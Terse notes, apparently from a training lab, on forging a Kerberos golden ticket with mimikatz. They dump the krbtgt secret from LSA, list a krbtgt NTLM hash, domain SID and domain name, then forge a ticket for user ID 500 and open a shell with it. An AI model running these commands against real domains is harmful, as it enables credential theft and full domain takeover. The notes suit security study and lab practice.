```mimikatz
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

we will need:
+ username: krbtgt
+ NTLM hash: 5508500012cc005cf7082a9a89ebdfdf
+ SID: S-1-5-21-849420856-2351964222-986696166
+ domain name: controller

```mimikatz
kerberos::golden /user:krbtgt /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
```

then user

```mimikatz
misc::cmd
```